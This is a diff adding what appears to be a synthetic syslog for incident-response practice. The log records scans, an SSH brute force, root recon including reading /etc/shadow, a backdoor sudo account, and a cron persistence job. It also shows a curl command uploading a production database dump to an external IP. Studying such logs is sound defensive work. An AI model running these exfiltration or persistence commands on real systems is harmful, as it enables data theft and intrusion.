@@ -1,26 +1,282 @@
-<134>Jun 10 08:01:23 webserver01 sshd[1042]: Accepted password for admin from 192.168.1.10 port 22 ssh2
-<134>Jun 10 08:01:45 webserver01 sshd[1043]: Failed password for root from 10.0.0.55 port 4521 ssh2
-<134>Jun 10 08:02:11 webserver01 sshd[1044]: Failed password for root from 10.0.0.55 port 4522 ssh2
-<134>Jun 10 08:02:33 webserver01 sshd[1045]: Failed password for root from 10.0.0.55 port 4523 ssh2
-<134>Jun 10 08:03:01 webserver01 sshd[1046]: Failed password for admin from 10.0.0.55 port 4524 ssh2
-<134>Jun 10 08:03:45 webserver01 sudo[1102]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
-<134>Jun 10 08:04:10 webserver01 sshd[1050]: Accepted publickey for deploy from 172.16.0.5 port 443 ssh2
-<134>Jun 10 08:05:00 webserver01 kernel: [12345.678] iptables: DROP IN=eth0 OUT= SRC=185.220.101.1 DST=10.0.0.1 PROTO=TCP DPT=22
-<134>Jun 10 08:05:30 webserver01 kernel: [12350.123] iptables: DROP IN=eth0 OUT= SRC=185.220.101.1 DST=10.0.0.1 PROTO=TCP DPT=3389
-<134>Jun 10 08:06:15 webserver01 cron[1200]: (root) CMD (/usr/lib/update-notifier/apt-check)
-<134>Jun 10 08:07:00 dbserver01 mysqld[2001]: [Warning] Access denied for user 'root'@'192.168.1.50' (using password: YES)
-<134>Jun 10 08:07:45 dbserver01 mysqld[2001]: [Warning] Access denied for user 'root'@'192.168.1.50' (using password: YES)
-<134>Jun 10 08:08:00 dbserver01 mysqld[2001]: [Warning] Access denied for user 'root'@'192.168.1.50' (using password: YES)
-<134>Jun 10 08:08:30 dbserver01 sshd[2100]: Accepted password for dbadmin from 10.0.0.1 port 22 ssh2
-<134>Jun 10 08:09:00 webserver01 nginx[1300]: 185.220.101.5 - - [10/Jun/2026:08:09:00 +0000] "GET /admin HTTP/1.1" 403 162
-<134>Jun 10 08:09:05 webserver01 nginx[1300]: 185.220.101.5 - - [10/Jun/2026:08:09:05 +0000] "GET /wp-admin HTTP/1.1" 404 162
-<134>Jun 10 08:09:10 webserver01 nginx[1300]: 185.220.101.5 - - [10/Jun/2026:08:09:10 +0000] "GET /phpmyadmin HTTP/1.1" 404 162
-<134>Jun 10 08:10:00 webserver01 sshd[1060]: Accepted password for admin from 192.168.1.10 port 22 ssh2
-<134>Jun 10 08:11:00 webserver01 sudo[1400]: admin : TTY=pts/1 ; PWD=/var/log ; USER=root ; COMMAND=/bin/cat auth.log
-<134>Jun 10 08:12:00 webserver01 kernel: [12600.001] iptables: ACCEPT IN=eth0 OUT= SRC=192.168.1.10 DST=10.0.0.1 PROTO=TCP DPT=443
-<134>Jun 10 08:13:00 dbserver01 sshd[2200]: Failed password for invalid user oracle from 45.33.32.156 port 51234 ssh2
-<134>Jun 10 08:13:30 dbserver01 sshd[2201]: Failed password for invalid user postgres from 45.33.32.156 port 51235 ssh2
-<134>Jun 10 08:14:00 dbserver01 sshd[2202]: Failed password for invalid user mysql from 45.33.32.156 port 51236 ssh2
-<134>Jun 10 08:15:00 webserver01 sshd[1070]: Disconnected from 192.168.1.10 port 22
-<134>Jun 10 08:16:00 webserver01 systemd[1]: Started Daily apt upgrade and clean activities.
-<134>Jun 10 08:17:00 webserver01 kernel: [12900.555] iptables: DROP IN=eth0 OUT= SRC=45.33.32.156 DST=10.0.0.1 PROTO=TCP DPT=22
+<134>Jun 10 07:00:01 webserver01 cron[800]: (root) CMD (/usr/bin/certbot renew --quiet)
+<134>Jun 10 07:00:05 webserver01 systemd[1]: Starting Daily Cleanup of Temporary Directories
+<134>Jun 10 07:01:00 dbserver01 mysqld[2001]: InnoDB: Buffer pool loaded in 0.327 sec
+<134>Jun 10 07:02:00 webserver01 sshd[1010]: Accepted publickey for jsmith from 192.168.1.100 port 52341 ssh2
+<134>Jun 10 07:02:05 webserver01 sshd[1010]: pam_unix(sshd:session): session opened for user jsmith by (uid=0)
+<134>Jun 10 07:02:10 webserver01 sudo[1011]: jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/systemctl status nginx
+<134>Jun 10 07:05:00 webserver01 nginx[1300]: 192.168.1.100 - - [10/Jun/2026:07:05:00 +0000] "GET /api/health HTTP/1.1" 200 45
+<134>Jun 10 07:05:30 appserver01 sshd[3001]: Accepted publickey for mgreen from 192.168.1.101 port 48820 ssh2
+<134>Jun 10 07:06:00 appserver01 sshd[3001]: pam_unix(sshd:session): session opened for user mgreen by (uid=0)
+<134>Jun 10 07:06:05 appserver01 sudo[3010]: mgreen : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/bin/systemctl restart app-service
+<134>Jun 10 07:08:00 appserver01 app-service[3100]: Application started on port 8080
+<134>Jun 10 07:10:00 dbserver01 mysqld[2001]: [Note] Access granted for user 'webapp'@'10.0.0.10' to database 'production'
+<134>Jun 10 07:10:30 webserver01 nginx[1300]: 203.0.113.45 - - [10/Jun/2026:07:10:30 +0000] "GET /index.html HTTP/1.1" 200 12043
+<134>Jun 10 07:12:00 webserver01 nginx[1300]: 203.0.113.45 - - [10/Jun/2026:07:12:00 +0000] "POST /api/login HTTP/1.1" 200 89
+<134>Jun 10 07:15:00 fileserver01 sshd[4001]: Accepted publickey for fileadmin from 192.168.1.50 port 33210 ssh2
+<134>Jun 10 07:15:05 fileserver01 sshd[4001]: pam_unix(sshd:session): session opened for user fileadmin by (uid=0)
+<134>Jun 10 07:20:00 webserver01 sshd[1015]: Accepted publickey for deploy from 192.168.1.100 port 55210 ssh2
+<134>Jun 10 07:20:05 webserver01 sshd[1015]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+<134>Jun 10 07:22:00 webserver01 sudo[1016]: deploy : TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/systemctl reload nginx
+<134>Jun 10 07:25:00 dbserver01 cron[2010]: (root) CMD (/usr/local/bin/db-backup.sh >> /var/log/db-backup.log 2>&1)
+<134>Jun 10 07:25:01 dbserver01 mysqldump[2050]: Dump started for database: production (148.3 MB)
+<134>Jun 10 07:28:00 dbserver01 mysqldump[2050]: Dump completed successfully
+<134>Jun 10 07:30:00 webserver01 nginx[1300]: 198.51.100.22 - - [10/Jun/2026:07:30:00 +0000] "GET /api/status HTTP/1.1" 200 112
+<134>Jun 10 07:35:00 webserver01 nginx[1300]: 203.0.113.45 - - [10/Jun/2026:07:35:00 +0000] "GET /products HTTP/1.1" 200 8820
+<134>Jun 10 07:38:00 webserver01 sshd[1015]: Disconnected from user deploy 192.168.1.100 port 55210
+<134>Jun 10 07:40:00 appserver01 sshd[3001]: Disconnected from user mgreen 192.168.1.101 port 48820
+<134>Jun 10 07:45:00 webserver01 cron[1200]: (root) CMD (/usr/lib/update-notifier/apt-check)
+<134>Jun 10 07:45:30 webserver01 kernel: [7200.123] iptables: ACCEPT IN=eth0 OUT= SRC=192.168.1.100 DST=10.0.0.10 PROTO=TCP DPT=443
+<134>Jun 10 07:50:00 dbserver01 mysqld[2001]: [Note] InnoDB: page_cleaner: 1000ms intended loop took 1120ms
+<134>Jun 10 07:55:00 webserver01 nginx[1300]: 203.0.113.88 - - [10/Jun/2026:07:55:00 +0000] "GET /robots.txt HTTP/1.1" 200 67
+<134>Jun 10 07:58:00 webserver01 sshd[1025]: Accepted publickey for jsmith from 192.168.1.100 port 52398 ssh2
+<134>Jun 10 07:58:10 webserver01 sshd[1025]: pam_unix(sshd:session): session opened for user jsmith by (uid=0)
+<134>Jun 10 07:59:00 webserver01 sudo[1026]: jsmith : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/bin/tail -f /var/log/syslog
+<134>Jun 10 08:00:11 webserver01 kernel: [8000.011] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=80
+<134>Jun 10 08:00:12 webserver01 kernel: [8000.012] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=443
+<134>Jun 10 08:00:13 webserver01 kernel: [8000.013] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=22
+<134>Jun 10 08:00:14 webserver01 kernel: [8000.014] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=21
+<134>Jun 10 08:00:15 webserver01 kernel: [8000.015] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=23
+<134>Jun 10 08:00:16 webserver01 kernel: [8000.016] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=3389
+<134>Jun 10 08:00:17 webserver01 kernel: [8000.017] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=3306
+<134>Jun 10 08:00:18 webserver01 kernel: [8000.018] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=5432
+<134>Jun 10 08:00:19 webserver01 kernel: [8000.019] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=8080
+<134>Jun 10 08:00:20 webserver01 kernel: [8000.020] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=8443
+<134>Jun 10 08:00:21 webserver01 kernel: [8000.021] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=25
+<134>Jun 10 08:00:22 webserver01 kernel: [8000.022] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=587
+<134>Jun 10 08:00:23 webserver01 kernel: [8000.023] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=993
+<134>Jun 10 08:00:24 webserver01 kernel: [8000.024] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=1433
+<134>Jun 10 08:00:25 webserver01 kernel: [8000.025] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=1521
+<134>Jun 10 08:00:26 webserver01 kernel: [8000.026] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=6379
+<134>Jun 10 08:00:27 webserver01 kernel: [8000.027] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=27017
+<134>Jun 10 08:00:28 webserver01 kernel: [8000.028] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=5900
+<134>Jun 10 08:00:29 webserver01 kernel: [8000.029] iptables: DROP IN=eth0 OUT= SRC=185.220.101.47 DST=10.0.0.10 PROTO=TCP DPT=111
+<134>Jun 10 08:01:00 webserver01 nginx[1300]: 185.220.101.47 - - [10/Jun/2026:08:01:00 +0000] "GET /admin HTTP/1.1" 403 162
+<134>Jun 10 08:01:02 webserver01 nginx[1300]: 185.220.101.47 - - [10/Jun/2026:08:01:02 +0000] "GET /wp-admin HTTP/1.1" 404 162
+<134>Jun 10 08:01:04 webserver01 nginx[1300]: 185.220.101.47 - - [10/Jun/2026:08:01:04 +0000] "GET /phpmyadmin HTTP/1.1" 404 162
+<134>Jun 10 08:01:06 webserver01 nginx[1300]: 185.220.101.47 - - [10/Jun/2026:08:01:06 +0000] "GET /.env HTTP/1.1" 404 162
+<134>Jun 10 08:01:08 webserver01 nginx[1300]: 185.220.101.47 - - [10/Jun/2026:08:01:08 +0000] "GET /config.php HTTP/1.1" 404 162
+<134>Jun 10 08:01:10 webserver01 nginx[1300]: 185.220.101.47 - - [10/Jun/2026:08:01:10 +0000] "GET /backup.zip HTTP/1.1" 404 162
+<134>Jun 10 08:01:12 webserver01 nginx[1300]: 185.220.101.47 - - [10/Jun/2026:08:01:12 +0000] "GET /api/v1/users HTTP/1.1" 401 89
+<134>Jun 10 08:01:14 webserver01 nginx[1300]: 185.220.101.47 - - [10/Jun/2026:08:01:14 +0000] "GET /shell.php HTTP/1.1" 404 162
+<134>Jun 10 08:01:16 webserver01 nginx[1300]: 185.220.101.47 - - [10/Jun/2026:08:01:16 +0000] "GET /xmlrpc.php HTTP/1.1" 404 162
+<134>Jun 10 08:03:00 webserver01 sshd[1030]: Invalid user scanner from 185.220.101.47 port 55001
+<134>Jun 10 08:03:01 webserver01 sshd[1030]: Connection closed by invalid user scanner 185.220.101.47 port 55001 [preauth]
+<134>Jun 10 08:10:00 webserver01 nginx[1300]: 198.51.100.22 - - [10/Jun/2026:08:10:00 +0000] "GET /api/status HTTP/1.1" 200 112
+<134>Jun 10 08:10:30 dbserver01 mysqld[2001]: [Note] Access granted for user 'webapp'@'10.0.0.10' to database 'production'
+<134>Jun 10 08:15:00 webserver01 nginx[1300]: 203.0.113.45 - - [10/Jun/2026:08:15:00 +0000] "GET /products HTTP/1.1" 200 8820
+<134>Jun 10 08:18:00 appserver01 sshd[3025]: Accepted publickey for mgreen from 192.168.1.101 port 48921 ssh2
+<134>Jun 10 08:18:10 appserver01 sshd[3025]: pam_unix(sshd:session): session opened for user mgreen by (uid=0)
+<134>Jun 10 08:25:01 webserver01 sshd[1100]: Failed password for root from 185.220.101.34 port 50001 ssh2
+<134>Jun 10 08:25:03 webserver01 sshd[1101]: Failed password for root from 185.220.101.34 port 50002 ssh2
+<134>Jun 10 08:25:05 webserver01 sshd[1102]: Failed password for root from 185.220.101.34 port 50003 ssh2
+<134>Jun 10 08:25:07 webserver01 sshd[1103]: Failed password for root from 185.220.101.34 port 50004 ssh2
+<134>Jun 10 08:25:09 webserver01 sshd[1104]: Failed password for root from 185.220.101.34 port 50005 ssh2
+<134>Jun 10 08:25:11 webserver01 sshd[1105]: Failed password for root from 185.220.101.34 port 50006 ssh2
+<134>Jun 10 08:25:13 webserver01 sshd[1106]: Failed password for admin from 185.220.101.34 port 50007 ssh2
+<134>Jun 10 08:25:15 webserver01 sshd[1107]: Failed password for admin from 185.220.101.34 port 50008 ssh2
+<134>Jun 10 08:25:17 webserver01 sshd[1108]: Failed password for admin from 185.220.101.34 port 50009 ssh2
+<134>Jun 10 08:25:19 webserver01 sshd[1109]: Failed password for admin from 185.220.101.34 port 50010 ssh2
+<134>Jun 10 08:25:21 webserver01 sshd[1110]: Failed password for administrator from 185.220.101.34 port 50011 ssh2
+<134>Jun 10 08:25:23 webserver01 sshd[1111]: Failed password for ubuntu from 185.220.101.34 port 50012 ssh2
+<134>Jun 10 08:25:25 webserver01 sshd[1112]: Failed password for ubuntu from 185.220.101.34 port 50013 ssh2
+<134>Jun 10 08:25:27 webserver01 sshd[1113]: Failed password for ubuntu from 185.220.101.34 port 50014 ssh2
+<134>Jun 10 08:25:29 webserver01 sshd[1114]: Failed password for test from 185.220.101.34 port 50015 ssh2
+<134>Jun 10 08:25:31 webserver01 sshd[1115]: Failed password for test from 185.220.101.34 port 50016 ssh2
+<134>Jun 10 08:25:33 webserver01 sshd[1116]: Failed password for guest from 185.220.101.34 port 50017 ssh2
+<134>Jun 10 08:25:35 webserver01 sshd[1117]: Failed password for guest from 185.220.101.34 port 50018 ssh2
+<134>Jun 10 08:25:37 webserver01 sshd[1118]: Failed password for oracle from 185.220.101.34 port 50019 ssh2
+<134>Jun 10 08:25:39 webserver01 sshd[1119]: Failed password for postgres from 185.220.101.34 port 50020 ssh2
+<134>Jun 10 08:25:41 webserver01 sshd[1120]: Failed password for mysql from 185.220.101.34 port 50021 ssh2
+<134>Jun 10 08:25:43 webserver01 sshd[1121]: Failed password for pi from 185.220.101.34 port 50022 ssh2
+<134>Jun 10 08:25:45 webserver01 sshd[1122]: Failed password for vagrant from 185.220.101.34 port 50023 ssh2
+<134>Jun 10 08:25:47 webserver01 sshd[1123]: Failed password for git from 185.220.101.34 port 50024 ssh2
+<134>Jun 10 08:25:49 webserver01 sshd[1124]: Failed password for git from 185.220.101.34 port 50025 ssh2
+<134>Jun 10 08:25:51 webserver01 sshd[1125]: Failed password for jenkins from 185.220.101.34 port 50026 ssh2
+<134>Jun 10 08:25:53 webserver01 sshd[1126]: Failed password for jenkins from 185.220.101.34 port 50027 ssh2
+<134>Jun 10 08:25:55 webserver01 sshd[1127]: Failed password for deploy from 185.220.101.34 port 50028 ssh2
+<134>Jun 10 08:25:57 webserver01 sshd[1128]: Failed password for deploy from 185.220.101.34 port 50029 ssh2
+<134>Jun 10 08:25:59 webserver01 sshd[1129]: Failed password for deploy from 185.220.101.34 port 50030 ssh2
+<134>Jun 10 08:26:01 webserver01 sshd[1130]: Failed password for www-data from 185.220.101.34 port 50031 ssh2
+<134>Jun 10 08:26:03 webserver01 sshd[1131]: Failed password for www-data from 185.220.101.34 port 50032 ssh2
+<134>Jun 10 08:26:05 webserver01 sshd[1132]: Failed password for tomcat from 185.220.101.34 port 50033 ssh2
+<134>Jun 10 08:26:07 webserver01 sshd[1133]: Failed password for tomcat from 185.220.101.34 port 50034 ssh2
+<134>Jun 10 08:26:09 webserver01 sshd[1134]: Failed password for hadoop from 185.220.101.34 port 50035 ssh2
+<134>Jun 10 08:26:11 webserver01 sshd[1135]: Failed password for ftp from 185.220.101.34 port 50036 ssh2
+<134>Jun 10 08:26:13 webserver01 sshd[1136]: Failed password for backup from 185.220.101.34 port 50037 ssh2
+<134>Jun 10 08:26:15 webserver01 sshd[1137]: Failed password for user from 185.220.101.34 port 50038 ssh2
+<134>Jun 10 08:26:17 webserver01 sshd[1138]: Failed password for support from 185.220.101.34 port 50039 ssh2
+<134>Jun 10 08:26:19 webserver01 sshd[1139]: Failed password for webmaster from 185.220.101.34 port 50040 ssh2
+<134>Jun 10 08:26:21 webserver01 sshd[1140]: Failed password for ansible from 185.220.101.34 port 50041 ssh2
+<134>Jun 10 08:26:23 webserver01 sshd[1141]: Failed password for sysadmin from 185.220.101.34 port 50042 ssh2
+<134>Jun 10 08:26:25 webserver01 sshd[1142]: Failed password for ec2-user from 185.220.101.34 port 50043 ssh2
+<134>Jun 10 08:26:27 webserver01 sshd[1143]: Failed password for centos from 185.220.101.34 port 50044 ssh2
+<134>Jun 10 08:26:29 webserver01 sshd[1144]: Failed password for debian from 185.220.101.34 port 50045 ssh2
+<134>Jun 10 08:26:31 webserver01 sshd[1145]: Failed password for operator from 185.220.101.34 port 50046 ssh2
+<134>Jun 10 08:26:33 webserver01 sshd[1146]: Failed password for deploy from 185.220.101.34 port 50047 ssh2
+<134>Jun 10 08:26:35 webserver01 sshd[1147]: Failed password for deploy from 185.220.101.34 port 50048 ssh2
+<134>Jun 10 08:26:37 webserver01 sshd[1148]: Failed password for deploy from 185.220.101.34 port 50049 ssh2
+<134>Jun 10 08:26:39 webserver01 sshd[1149]: Failed password for deploy from 185.220.101.34 port 50050 ssh2
+<134>Jun 10 08:26:41 webserver01 sshd[1150]: Failed password for deploy from 185.220.101.34 port 50051 ssh2
+<134>Jun 10 08:26:43 webserver01 sshd[1151]: Failed password for deploy from 185.220.101.34 port 50052 ssh2
+<134>Jun 10 08:26:45 webserver01 sshd[1152]: Failed password for deploy from 185.220.101.34 port 50053 ssh2
+<134>Jun 10 08:26:47 webserver01 sshd[1153]: Failed password for deploy from 185.220.101.34 port 50054 ssh2
+<134>Jun 10 08:26:49 webserver01 sshd[1154]: Failed password for deploy from 185.220.101.34 port 50055 ssh2
+<134>Jun 10 08:26:51 webserver01 sshd[1155]: Failed password for deploy from 185.220.101.34 port 50056 ssh2
+<134>Jun 10 08:26:53 webserver01 sshd[1156]: Failed password for root from 185.220.101.34 port 50057 ssh2
+<134>Jun 10 08:26:55 webserver01 sshd[1157]: Failed password for root from 185.220.101.34 port 50058 ssh2
+<134>Jun 10 08:26:57 webserver01 sshd[1158]: Failed password for admin from 185.220.101.34 port 50059 ssh2
+<134>Jun 10 08:26:59 webserver01 sshd[1159]: Failed password for admin from 185.220.101.34 port 50060 ssh2
+<134>Jun 10 08:27:01 webserver01 sshd[1160]: Failed password for deploy from 185.220.101.34 port 50061 ssh2
+<134>Jun 10 08:27:03 webserver01 sshd[1161]: Failed password for deploy from 185.220.101.34 port 50062 ssh2
+<134>Jun 10 08:27:05 webserver01 sshd[1162]: Failed password for deploy from 185.220.101.34 port 50063 ssh2
+<134>Jun 10 08:27:07 webserver01 sshd[1163]: Failed password for deploy from 185.220.101.34 port 50064 ssh2
+<134>Jun 10 08:27:09 webserver01 sshd[1164]: Failed password for deploy from 185.220.101.34 port 50065 ssh2
+<134>Jun 10 08:27:11 webserver01 sshd[1165]: Failed password for deploy from 185.220.101.34 port 50066 ssh2
+<134>Jun 10 08:27:13 webserver01 sshd[1166]: Failed password for deploy from 185.220.101.34 port 50067 ssh2
+<134>Jun 10 08:27:15 webserver01 sshd[1167]: Failed password for deploy from 185.220.101.34 port 50068 ssh2
+<134>Jun 10 08:27:17 webserver01 sshd[1168]: Failed password for deploy from 185.220.101.34 port 50069 ssh2
+<134>Jun 10 08:27:19 webserver01 sshd[1169]: Failed password for deploy from 185.220.101.34 port 50070 ssh2
+<134>Jun 10 08:27:21 webserver01 sshd[1170]: Failed password for ubuntu from 185.220.101.34 port 50071 ssh2
+<134>Jun 10 08:27:23 webserver01 sshd[1171]: Failed password for svcaccount from 185.220.101.34 port 50072 ssh2
+<134>Jun 10 08:27:25 webserver01 sshd[1172]: Failed password for ftpuser from 185.220.101.34 port 50073 ssh2
+<134>Jun 10 08:27:27 webserver01 sshd[1173]: Failed password for deploy from 185.220.101.34 port 50074 ssh2
+<134>Jun 10 08:27:29 webserver01 sshd[1174]: Failed password for deploy from 185.220.101.34 port 50075 ssh2
+<134>Jun 10 08:27:31 webserver01 sshd[1175]: Failed password for deploy from 185.220.101.34 port 50076 ssh2
+<134>Jun 10 08:27:33 webserver01 sshd[1176]: Failed password for deploy from 185.220.101.34 port 50077 ssh2
+<134>Jun 10 08:27:35 webserver01 sshd[1177]: Failed password for deploy from 185.220.101.34 port 50078 ssh2
+<134>Jun 10 08:27:37 webserver01 sshd[1178]: Failed password for deploy from 185.220.101.34 port 50079 ssh2
+<134>Jun 10 08:27:39 webserver01 sshd[1179]: Failed password for deploy from 185.220.101.34 port 50080 ssh2
+<134>Jun 10 08:27:41 webserver01 sshd[1180]: Failed password for deploy from 185.220.101.34 port 50081 ssh2
+<134>Jun 10 08:27:43 webserver01 sshd[1181]: Failed password for deploy from 185.220.101.34 port 50082 ssh2
+<134>Jun 10 08:27:45 webserver01 sshd[1182]: Failed password for deploy from 185.220.101.34 port 50083 ssh2
+<134>Jun 10 08:27:47 webserver01 sshd[1183]: Failed password for root from 185.220.101.34 port 50084 ssh2
+<134>Jun 10 08:27:49 webserver01 sshd[1184]: Failed password for root from 185.220.101.34 port 50085 ssh2
+<134>Jun 10 08:27:51 webserver01 sshd[1185]: Failed password for admin from 185.220.101.34 port 50086 ssh2
+<134>Jun 10 08:27:53 webserver01 sshd[1186]: Failed password for deploy from 185.220.101.34 port 50087 ssh2
+<134>Jun 10 08:27:55 webserver01 sshd[1187]: Failed password for deploy from 185.220.101.34 port 50088 ssh2
+<134>Jun 10 08:27:57 webserver01 sshd[1188]: Failed password for deploy from 185.220.101.34 port 50089 ssh2
+<134>Jun 10 08:27:59 webserver01 sshd[1189]: Failed password for deploy from 185.220.101.34 port 50090 ssh2
+<134>Jun 10 08:28:01 webserver01 sshd[1190]: Failed password for deploy from 185.220.101.34 port 50091 ssh2
+<134>Jun 10 08:28:03 webserver01 sshd[1191]: Failed password for deploy from 185.220.101.34 port 50092 ssh2
+<134>Jun 10 08:28:05 webserver01 sshd[1192]: Failed password for deploy from 185.220.101.34 port 50093 ssh2
+<134>Jun 10 08:28:07 webserver01 sshd[1193]: Failed password for deploy from 185.220.101.34 port 50094 ssh2
+<134>Jun 10 08:28:09 webserver01 sshd[1194]: Failed password for deploy from 185.220.101.34 port 50095 ssh2
+<134>Jun 10 08:28:11 webserver01 sshd[1195]: Failed password for deploy from 185.220.101.34 port 50096 ssh2
+<134>Jun 10 08:28:13 webserver01 sshd[1196]: Failed password for deploy from 185.220.101.34 port 50097 ssh2
+<134>Jun 10 08:28:15 webserver01 sshd[1197]: Failed password for root from 185.220.101.34 port 50098 ssh2
+<134>Jun 10 08:28:17 webserver01 sshd[1198]: Failed password for root from 185.220.101.34 port 50099 ssh2
+<134>Jun 10 09:10:01 webserver01 sshd[1200]: Accepted password for deploy from 185.220.101.34 port 50100 ssh2
+<134>Jun 10 09:10:02 webserver01 sshd[1200]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+<134>Jun 10 09:10:08 webserver01 sudo[1201]: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id
+<134>Jun 10 09:10:12 webserver01 sudo[1202]: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/uname -a
+<134>Jun 10 09:10:18 webserver01 sudo[1203]: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/passwd
+<134>Jun 10 09:10:22 webserver01 sudo[1204]: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow
+<134>Jun 10 09:10:26 webserver01 sudo[1205]: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/find / -name "*.conf" -readable 2>/dev/null
+<134>Jun 10 09:10:30 webserver01 sudo[1206]: deploy : TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/cat config.php
+<134>Jun 10 09:10:35 webserver01 sudo[1207]: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/netstat -tulnp
+<134>Jun 10 09:10:40 webserver01 sudo[1208]: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/arp -n
+<134>Jun 10 09:10:45 webserver01 sudo[1209]: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /proc/net/arp
+<134>Jun 10 09:11:00 webserver01 sudo[1210]: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+<134>Jun 10 09:11:01 webserver01 sudo[1210]: pam_unix(sudo:session): session opened for user root by deploy(uid=0)
+<134>Jun 10 09:12:00 webserver01 useradd[1300]: new user: name=svc_monitor, UID=1099, GID=1099, home=/home/svc_monitor, shell=/bin/bash
+<134>Jun 10 09:12:05 webserver01 passwd[1301]: password changed for svc_monitor
+<134>Jun 10 09:12:10 webserver01 usermod[1302]: add 'svc_monitor' to group 'sudo'
+<134>Jun 10 09:12:15 webserver01 sshd[1205]: Accepted password for deploy from 192.168.1.100 port 52500 ssh2
+<134>Jun 10 09:15:00 dbserver01 sshd[5001]: Accepted password for dbuser from 10.0.0.10 port 45001 ssh2
+<134>Jun 10 09:15:01 dbserver01 sshd[5001]: pam_unix(sshd:session): session opened for user dbuser by (uid=0)
+<134>Jun 10 09:15:10 dbserver01 sudo[5010]: dbuser : TTY=pts/0 ; PWD=/home/dbuser ; USER=root ; COMMAND=/bin/bash
+<134>Jun 10 09:15:11 dbserver01 sudo[5010]: pam_unix(sudo:session): session opened for user root by dbuser(uid=0)
+<134>Jun 10 09:15:20 dbserver01 mysqld[2001]: [Warning] root login attempt from 127.0.0.1
+<134>Jun 10 09:15:25 dbserver01 sudo[5020]: dbuser : TTY=pts/0 ; PWD=/var/lib/mysql ; USER=root ; COMMAND=/usr/bin/mysqldump -u root production
+<134>Jun 10 09:15:40 dbserver01 sudo[5021]: dbuser : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -s -X POST https://91.92.251.103/upload -F file=@/tmp/production.sql
+<134>Jun 10 09:16:00 dbserver01 kernel: [15000.001] iptables: ACCEPT IN=eth0 OUT=eth1 SRC=10.0.0.20 DST=91.92.251.103 PROTO=TCP DPT=443
+<134>Jun 10 09:16:20 dbserver01 kernel: [15020.001] conntrack: [ASSURED] src=10.0.0.20 dst=91.92.251.103 sport=60001 dport=443 packets=24832 bytes=256901120
+<134>Jun 10 09:16:30 dbserver01 useradd[5030]: new user: name=svc_monitor, UID=1099, GID=1099, home=/home/svc_monitor, shell=/bin/bash
+<134>Jun 10 09:17:00 dbserver01 cron[5100]: (root) RELOAD (/etc/crontab)
+<134>Jun 10 09:17:05 dbserver01 cron[5101]: (root) CMD (/tmp/.svc_update > /dev/null 2>&1)
+<134>Jun 10 09:18:00 appserver01 sshd[7001]: Failed password for appadmin from 10.0.0.10 port 47001 ssh2
+<134>Jun 10 09:18:05 appserver01 sshd[7002]: Failed password for appadmin from 10.0.0.10 port 47002 ssh2
+<134>Jun 10 09:18:10 appserver01 sshd[7003]: Failed password for appadmin from 10.0.0.10 port 47003 ssh2
+<134>Jun 10 09:18:15 appserver01 sshd[7004]: Failed password for root from 10.0.0.10 port 47004 ssh2
+<134>Jun 10 09:18:20 appserver01 sshd[7005]: Failed password for admin from 10.0.0.10 port 47005 ssh2
+<134>Jun 10 09:18:25 appserver01 sshd[7006]: Connection closed by 10.0.0.10 port 47006 [preauth]
+<134>Jun 10 09:20:00 fileserver01 sshd[6001]: Accepted password for fileadmin from 10.0.0.10 port 46001 ssh2
+<134>Jun 10 09:20:01 fileserver01 sshd[6001]: pam_unix(sshd:session): session opened for user fileadmin by (uid=0)
+<134>Jun 10 09:20:10 fileserver01 sudo[6010]: fileadmin : TTY=pts/0 ; PWD=/home/fileadmin ; USER=root ; COMMAND=/bin/bash
